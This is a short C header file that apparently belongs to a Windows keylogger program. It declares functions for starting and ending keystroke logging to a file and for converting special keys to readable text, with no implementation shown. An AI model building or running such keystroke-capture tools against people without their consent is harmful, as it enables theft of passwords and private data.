#include <stdio.h>

#ifndef WIN_KEYLOG_H
#define WIN_KEYLOG_H

void winWriteHeader(const char* filePath);
char* SpecialKeyToReadable(int data);
int isSpecialKey(char data);
void windows_keylog(const char* file);
void end_keylog(const char* filePath);

#endif // WIN_KEYLOG_H